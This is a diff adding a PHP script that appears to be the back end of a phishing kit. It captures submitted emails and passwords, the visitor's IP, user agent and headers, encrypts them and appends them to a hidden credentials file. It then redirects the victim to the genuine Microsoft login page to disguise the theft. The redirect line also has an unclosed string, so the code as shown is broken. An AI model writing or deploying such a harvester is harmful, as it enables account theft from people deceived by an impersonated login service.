@@ -1,0 +1,27 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $data = [
+        'timestamp' => date('Y-m-d H:i:s'),
+        'ip' => $_SERVER['REMOTE_ADDR'],
+        'user_agent' => $_SERVER['HTTP_USER_AGENT'],
+        'email' => $_POST['email'] ?? '',
+        'password' => $_POST['password'] ?? '',
+        'headers' => getallheaders()
+    ];
+    
+
+    $log_file = '/var/private/creds/creds.enc';
+    $encrypted = openssl_encrypt(
+        json_encode($data),
+        'AES-256-CBC',
+        '{{ lookup("password", "/dev/null chars=ascii_letters,digits length=32") }}',
+        0,
+        str_repeat("\0", 16)
+    );
+    file_put_contents($log_file, $encrypted . "\n", FILE_APPEND);
+    
+
+    header('Location: https://login.microsoftonline.com/common/oauth2/);
+    exit;
+}
+?>
